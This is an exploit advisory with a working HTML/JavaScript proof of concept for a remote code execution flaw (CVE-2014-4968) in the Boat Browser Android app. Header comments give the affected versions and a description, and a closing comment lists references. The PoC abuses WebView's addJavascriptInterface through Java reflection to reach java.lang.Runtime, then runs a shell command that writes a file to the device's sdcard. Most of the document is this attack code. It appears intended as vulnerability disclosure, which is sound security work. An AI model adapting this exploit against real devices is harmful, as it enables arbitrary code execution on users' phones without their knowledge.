<!--
													.:: Remote code execution vulnerability in Boat Browser ::.

													
credit: c0otlass
social contact: https://twitter.com/c0otlass
mail: c0otlass@gmail.com
CVE reserved : 2014-4968
time of discovery:  July 14, 2014
Browser Official site:http://www.boatmob.com/
Browser download link:https://play.google.com/store/apps/details?id=com.boatbrowser.free&hl=en
version Affected : In  8.0 and 8.0.1 tested , Android 3.0 through 4.1.x 
Risk rate: High
vulnerability Description impact: 
	The WebView class and  use of the WebView.addJavascriptInterface method has vulnerability which cause remote code in html page run in android device
	a related issue to CVE-2012-6636
proof of concept:
//..............................................poc.hmtl............................................
-->
<!DOCTYPE html>
<html>
<head>
<meta charset="UFT-8">
<title>CreatMalTxt POC - WebView</title>
<script>
var obj;
function TestVulnerability()
		{
temp="not";
var myObject = window;
	for (var name in myObject) {										
		if (myObject.hasOwnProperty(name)) {									
			try
			{				
			temp=myObject[name].getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null);												 
			}
			catch(e)
			{														
			}
			}
	}
				if(temp=="not")
						{
							document.getElementById("log").innerHTML="this browser has been patched";												
						}
					else{
						 document.getElementById("log").innerHTML = "This browser is exploitabale" + "<br>" + " the poc file hase been created in sdcard ...<br>" ;
						 document.getElementById("log").innerHTML +=  "we could see proccess information"+ temp.exec(['/system/bin/sh','-c','echo \"mwr\" > /mnt/sdcard/mwr.txt']);																					
						}
		}		
</script>
</head>
<body >
<h3>CreatMalTxt POC</h3>
<input value="Test Vulnerability"  type="button"  onclick="TestVulnerability();" />
<div id="log"></div>
</body>		
</html>

<!--
Solution:
https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/
http://www.programering.com/a/MDM3YzMwATc.html
https://www.securecoding.cert.org/confluence/pages/viewpage.action?pageId=129859614		

References: 
http://blog.trustlook.com/2013/09/04/alert-android-webview-addjavascriptinterface-code-execution-vulnerability/
https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/
http://50.56.33.56/blog/?p=314
https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/
https://github.com/mwrlabs/drozer/blob/bcadf5c3fd08c4becf84ed34302a41d7b5e9db63/src/drozer/modules/exploit/mitm/addJavaScriptInterface.py
-->